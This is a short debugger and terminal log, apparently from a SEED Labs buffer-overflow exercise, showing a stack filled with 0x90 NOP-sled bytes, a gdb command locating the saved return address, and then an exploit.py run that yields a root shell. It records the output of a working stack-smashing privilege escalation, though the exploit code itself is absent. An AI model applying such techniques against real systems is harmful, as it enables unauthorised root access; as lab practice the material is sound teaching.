ECX: 0xffffd600 --> 0xffffd620 --> 0x1 
EDX: 0xffffd3b7 --> 0xffffd620 --> 0x1 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd358 --> 0x90909090 
ESP: 0xffffd120 --> 0xf7fd14f0 --> 0xbc 
EIP: 0x56556264 (<foo+55>:	leave)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556259 <foo+44>:	add    esp,0x10
   0x5655625c <foo+47>:	mov    eax,0x1
   0x56556261 <foo+52>:	mov    ebx,DWORD PTR [ebp-0x4]
=> 0x56556264 <foo+55>:	leave  
   0x56556265 <foo+56>:	ret    
   0x56556266 <main>:	endbr32 
   0x5655626a <main+4>:	lea    ecx,[esp+0x4]
   0x5655626e <main+8>:	and    esp,0xfffffff0
[------------------------------------stack-------------------------------------]
0000| 0xffffd120 --> 0xf7fd14f0 --> 0xbc 
0004| 0xffffd124 --> 0x85bdb5ef 
0008| 0xffffd128 --> 0xffffd150 --> 0x90909090 
0012| 0xffffd12c --> 0x90000008 
0016| 0xffffd130 --> 0x90909090 
0020| 0xffffd134 --> 0x90909090 
0024| 0xffffd138 --> 0x90909090 
0028| 0xffffd13c --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x56556264 in foo (
    str=0x90909090 <error: Cannot access memory at address 0x90909090>)
    at A1.c:19
19	}
gdb-peda$ p (*(unsigned*)($ebp+4))
$1 = 0xffffd180
gdb-peda$ q
[06/17/22]seed@VM:~/.../a1_16$ python3 exploit.py 
[06/17/22]seed@VM:~/.../a1_16$ ./A1
# whoami                                                                       
root
# allah hafez
